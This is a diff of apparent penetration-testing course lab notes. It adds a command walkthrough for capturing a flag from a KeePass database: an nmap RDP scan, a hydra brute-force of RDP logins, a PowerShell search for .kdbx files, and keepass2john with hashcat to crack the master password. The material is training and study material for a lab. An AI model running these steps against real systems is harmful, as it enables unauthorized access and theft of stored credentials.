@@ -77,12 +77,42 @@ Lab 1 - Follow the steps outlined in this section to obtain the master password 
 >``` shell
 >xfreerdp3 /u:jason /p:lab /v:192.168.243.203
 >
+>nmap -p 3389 -sV 192.168.241.227
 >
+>hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
+>
+>xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
+>
+># Run POwershell as administrator
+>
+>Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+>> Select DisplayName
+>
+>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+>
+># Copy C:\Users\nadine\Documents\Database.kdbx from Windows to Kali
+>
+>keepass2john Database.kdbx > keepass.hash
+>
+>sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
+>
+>cat keepass.hash
+>
+>hashcat --help | grep -i keepass
+>
+>hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
+>-r /usr/share/hashcat/rules/rockyou-30000.rule
+>
+># On Windows open Database.kdbx using discovered password (pinkpanther1234)
+>
+># Obtain the password stored as title "flag" in the password manager
 >```
 >
 
 Lab 2 - Enumerate VM #2 and get access to the system as user nadine. Obtain the password stored as title "flag" in the password manager and enter it as answer to this exercise. Note that the flag is not formatted as OS{} for this exercise.
 >``` shell
+>nmap -p- --open -sS -n 192.168.241.227
+>
 >
 >```
 >
